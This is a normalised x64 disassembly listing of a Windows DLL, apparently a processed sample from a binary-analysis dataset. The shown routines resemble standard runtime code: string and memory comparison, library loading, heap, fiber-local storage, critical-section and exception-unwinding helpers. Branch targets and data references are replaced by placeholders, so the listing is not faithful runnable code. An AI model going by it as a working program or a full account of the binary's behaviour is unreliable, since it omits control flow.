mov rcx [ rbp - 0x20 ]
mov [ rsp + 0x38 ] edx
lea r8 [ rbp + 0x38 ]
mov eax [ rcx + 0x14 ]
mov [ rsp + 0x30 ] eax
mov eax [ rcx + 0x4 ]
lea rcx [ rbp - 0x20 ]
mov [ rsp + 0x28 ] eax
lea rax [ rbp + 0x20 ]
mov [ rsp + 0x20 ] rax
call sub_180007cbc
test eax eax
jne r-xdata
mov rsi [ rsp + 0x88 ]
add rsp 0x60
pop r12
pop rdi
pop rbp
retn
mov rcx [ rbp - 0x10 ]
and [ rcx + 0xc8 ] 0xfffffffd
xor eax eax
jmp r-xdata
mov rax [ rbp - 0x10 ]
and [ rax + 0xc8 ] 0xfffffffd
sub_180008500
sub rdx rcx
mov r9 rdx
test cl 0x7
je r-xdata
mov r11 0x8101010101010100
mov al [ rcx ]
mov dl [ rcx + r9 ]
cmp al dl
jne r-xdata
mov rax [ rcx ]
mov rdx [ rcx + r9 ]
cmp rax rdx
jne r-xdata
sbb rax rax
sbb rax 0xffffffffffffffff
retn
inc rcx
test al al
je r-xdata
mov r10 0x7efefefefefefeff
add r10 rdx
xor rax 0xffffffffffffffff
add rcx 0x8
xor rax r10
test r11 rax
je r-xdata
xor eax eax
retn
test rcx 0x7
jne r-xdata
lea rdx [ rcx + r9 ]
and dx 0xfff
cmp dx 0xff8
ja r-xdata
jmp r-xdata
nop
test dl dl
je r-xdata
xor eax eax
retn
test dh dh
je r-xdata
shr rdx 0x10
test dl dl
je r-xdata
test dh dh
je r-xdata
shr rdx 0x10
test dl dl
je r-xdata
test dh dh
je r-xdata
shr edx 0x10
test dl dl
je r-xdata
test dh dh
jne r-xdata
sub_1800085c0
sub rdx rcx
cmp r8 0x8
jb r-xdata
test r8 r8
je r-xdata
test cl 0x7
je r-xdata
xor rax rax
retn
mov al [ rcx ]
cmp al [ rdx + rcx ]
jne r-xdata
mov r9 r8
shr r9 0x3
jne r-xdata
nop
sbb eax eax
sbb eax 0xffffffff
retn
inc rcx
dec r8
jne r-xdata
shr r9 0x2
je r-xdata
inc rcx
dec r8
test cl 0x7
jne r-xdata
mov r9 r8
shr r9 0x3
je r-xdata
mov rax [ rcx ]
cmp rax [ rdx + rcx ]
jne r-xdata
mov al [ rcx ]
cmp al [ rdx + rcx ]
jne r-xdata
mov rax [ rcx ]
cmp rax [ rdx + rcx ]
jne r-xdata
mov rcx [ rcx + rdx ]
bswap rax
bswap rcx
cmp rax rcx
sbb eax eax
sbb eax 0xffffffff
retn
mov rax [ rcx + 0x8 ]
cmp rax [ rdx + rcx + 0x8 ]
jne r-xdata
add rcx 0x8
dec r9
jne r-xdata
add rcx 0x8
mov rax [ rcx + 0x10 ]
cmp rax [ rdx + rcx + 0x10 ]
jne r-xdata
and r8 0x7
jmp r-xdata
add rcx 0x8
mov rax [ rcx + 0x18 ]
cmp rax [ rdx + rcx + 0x18 ]
jne r-xdata
add rcx 0x8
add rcx 0x20
dec r9
jne r-xdata
and r8 0x1f
sub_1800086a0
test r8 r8
je r-xdata
xor rax rax
retn
sub rdx rcx
mov r9 rdx
mov r11 0x8101010101010100
test cl 0x7
je r-xdata
lea rdx [ rcx + r9 ]
and dx 0xfff
cmp dx 0xff8
ja r-xdata
mov al [ rcx ]
mov dl [ rcx + r9 ]
inc rcx
cmp al dl
jne r-xdata
mov rax [ rcx ]
mov rdx [ rcx + r9 ]
cmp rax rdx
jne r-xdata
sbb rax rax
sbb rax 0xffffffffffffffff
retn
dec r8
je r-xdata
add rcx 0x8
sub r8 0x8
mov r10 0x7efefefefefefeff
jbe r-xdata
test al al
je r-xdata
xor rax 0xffffffffffffffff
add r10 rdx
xor rax r10
test r11 rax
je r-xdata
test rcx 0x7
jne r-xdata
jmp r-xdata
test dl dl
je r-xdata
xor rax rax
retn
test dh dh
je r-xdata
shr rdx 0x10
test dl dl
je r-xdata
test dh dh
je r-xdata
shr rdx 0x10
test dl dl
je r-xdata
test dh dh
je r-xdata
shr edx 0x10
test dl dl
je r-xdata
test dh dh
jne r-xdata
sub_180001030
push rbx
sub rsp 0x20
mov rbx rcx
call [ GetModuleHandleA@IAT ]
test rax rax
jne r-xdata
add rsp 0x20
pop rbx
retn
mov rcx rbx
call [ LoadLibraryA@IAT ]
sub_1800021a0
mov rcx rw-data
call sub_180001aa0
jmp rax
sub_180003058
sub rsp 0x28
mov r8 [ r9 + 0x38 ]
mov rcx rdx
mov rdx r9
call sub_180002ff4
mov eax 0x1
add rsp 0x28
retn
sub_180003090
cmp rcx [ rw-data ]
jne r-xdata
jmp sub_180003968
rol rcx 0x10
test cx 0xffff
jne r-xdata
ror rcx 0x10
retn
sub_180003b64
mov [ rw-data ] rcx
retn
sub_180003bf8
sub rsp 0x28
mov rcx [ rw-data ]
call [ HeapDestroy@IAT ]
and [ rw-data ] 0x0
add rsp 0x28
retn
sub_180003edc
xor eax eax
retn
sub_180003ee0
sub rsp 0x28
mov ecx [ rw-data ]
cmp ecx 0xffffffff
je r-xdata
add rsp 0x28
jmp sub_180005570
call [ FlsFree@IAT ]
or [ rw-data ] 0xffffffff
sub_180004428
push rbx
sub rsp 0x20
mov ebx ecx
call sub_1800043ec
mov ecx ebx
call [ ExitProcess@IAT ]
sub_180004440
mov ecx 0x8
jmp sub_1800056f8
sub_18000444c
mov ecx 0x8
jmp sub_1800055f8
sub_18000474c
xor r8d r8d
lea edx [ r8 + 0x1 ]
jmp sub_1800045bc
sub_180004758
xor edx edx
xor ecx ecx
lea r8d [ rdx + 0x1 ]
jmp sub_1800045bc
sub_180004768
push rbx
sub rsp 0x20
mov ebx ecx
call sub_1800059c8
mov ecx ebx
call sub_180005768
xor r8d r8d
mov ecx 0xff
lea edx [ r8 + 0x1 ]
call sub_1800045bc
int3
sub_180005204
mov eax 0xe06d7363
cmp ecx eax
jne r-xdata
xor eax eax
retn
mov ecx eax
jmp sub_180005034
sub_1800052d4
mov [ rw-data ] rcx
retn
sub_1800054cc
sub rsp 0x38
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_18000545c
add rsp 0x38
retn
sub_1800055f8
movsxd rcx ecx
lea rax [ rw-data ]
add rcx rcx
mov rcx [ rax + rcx * 8 ]
jmp [ LeaveCriticalSection@IAT ]
sub_180005a20
sub rsp 0x4d8
xor r8 r8
xor r9 r9
mov [ rsp + 0x20 ] rsp
mov [ rsp + 0x28 ] r8
call RtlUnwindEx
add rsp 0x4d8
retn
sub_180005a50
mov [ rsp + 0x8 ] rcx
mov [ rsp + 0x18 ] rdx
mov [ rsp + 0x10 ] r8d
mov r9 0x19930520
jmp sub_180005a70
sub_180005a70
retn
sub_180005a80
retn
sub_180006794
sub rsp 0x28
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
add rsp 0x28
retn
mov ecx 0xfffffffd
call sub_1800065b4
mov [ rw-data ] 0x1
sub_180006858
sub rsp 0x28
call sub_180004044
mov rcx [ rax + 0xd0 ]
test rcx rcx
je r-xdata
call sub_180007d78
call rcx
jmp r-xdata
sub_180006876
add rsp 0x28
retn
sub_18000687c
sub rsp 0x28
lea rcx [ sub_180006858 ]
call [ EncodePointer@IAT ]
mov [ rw-data ] rax
add rsp 0x28
retn
sub_18000689c
mov [ rw-data ] rcx
mov [ rw-data ] rcx
mov [ rw-data ] rcx
mov [ rw-data ] rcx
retn
sub_1800068bc
mov rcx [ rw-data ]
jmp [ DecodePointer@IAT ]
sub_180006b00
mov [ rw-data ] rcx
retn
sub_180006b08
mov [ rw-data ] rcx
retn
sub_180006c60
sub rsp 0x28
call sub_180006b54
neg rax
sbb eax eax
neg eax
dec eax
add rsp 0x28
retn
sub_180006e54
mov edx ecx
mov r9d 0x4
xor r8d r8d
xor ecx ecx
jmp sub_180006dd8
sub_1800071c8
mov rax rcx
movzx edx [ rax ]
add rax 0x2
test dx dx
jne r-xdata
sub rax rcx
sar rax 0x1
dec rax
retn
RtlVirtualUnwind
jmp [ RtlVirtualUnwind@IAT ]
RtlLookupFunctionEntry
jmp [ RtlLookupFunctionEntry@IAT ]
RtlUnwindEx
jmp [ RtlUnwindEx@IAT ]
sub_180008398
xor eax eax
test rdx rdx
je r-xdata
retn
cmp [ rcx ] 0x0
je r-xdata
inc rax
inc rcx
cmp rax rdx
jb r-xdata
sub_1800085a8
sbb rax rax
sbb rax 0xffffffffffffffff
retn
sub_180008760
push rbp
sub rsp 0x20
mov rbp rdx
cmp [ rbp + 0x40 ] 0x0
jne r-xdata
add rsp 0x20
pop rbp
retn
cmp [ rw-data ] 0xffffffff
je r-xdata
call sub_180003ee0
nop
sub_180008786
push rbp
sub rsp 0x20
mov rbp rdx
mov rax [ rcx ]
mov rdx rcx
mov ecx [ rax ]
call sub_180005204
nop
add rsp 0x20
pop rbp
retn
sub_1800087a4
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx 0xd
call sub_1800055f8
nop
add rsp 0x20
pop rbp
retn
sub_1800087c4
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx 0xc
call sub_1800055f8
nop
add rsp 0x20
pop rbp
retn
sub_1800087df
push rbp
sub rsp 0x20
mov rbp rdx
cmp [ rbp + 0x80 ] 0x0
je r-xdata
add rsp 0x20
pop rbp
retn
mov ecx 0x8
call sub_1800055f8
nop
sub_180008803
push rbp
sub rsp 0x20
mov rbp rdx
mov rcx [ rw-data ]
call [ LeaveCriticalSection@IAT ]
nop
add rsp 0x20
pop rbp
retn
sub_180008830
push rbp
sub rsp 0x20
mov rbp rdx
mov rax [ rcx ]
xor ecx ecx
cmp [ rax ] 0xc0000005
sete cl
mov eax ecx
mov eax ecx
add rsp 0x20
pop rbp
retn
sub_180008852
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx 0xc
call sub_1800055f8
nop
add rsp 0x20
pop rbp
retn
sub_18000886d
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx 0xd
call sub_1800055f8
nop
add rsp 0x20
pop rbp
retn
sub_180008888
push rbp
sub rsp 0x20
mov rbp rdx
cmp [ rbp + 0x60 ] 0x0
je r-xdata
add rsp 0x20
pop rbp
retn
xor ecx ecx
call sub_1800055f8
nop
sub_1800088a6
push rbp
sub rsp 0x20
mov rbp rdx
call sub_18000444c
nop
add rsp 0x20
pop rbp
retn
